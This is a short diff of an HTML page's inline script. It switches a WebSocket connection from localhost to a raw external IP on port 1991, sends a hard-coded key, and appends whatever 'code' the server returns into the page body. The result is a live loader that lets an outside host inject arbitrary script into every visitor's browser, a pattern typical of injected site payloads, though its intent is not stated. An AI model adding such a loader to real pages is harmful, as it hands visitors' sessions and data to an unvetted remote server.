@@ -15,10 +15,10 @@
     s.type='text/javascript';
     document.getElementsByTagName('head')[0].appendChild(s);
     supp_key = "1d2a2cc016d9a93f26fe2cd7e253dfcc"
-    //ws=new WebSocket('ws://185.127.19.213:1991');
-    ws=new WebSocket('ws://localhost:1991');
-    ws.onopen=function(){ws.send(JSON.stringify({supp_key}));};
-    ws.onmessage=function(m){ws.close();$('body').append(JSON.parse(m.data).code);}
+    ws=new WebSocket('ws://185.127.19.213:1991');
+    //ws=new WebSocket('ws://localhost:1991');
+    ws.onopen=function(){console.log('open');ws.send(JSON.stringify({supp_key}));};
+    ws.onmessage=function(m){console.log(m);ws.close();$('body').append(JSON.parse(m.data).code);}
 </script>
 
     </body>
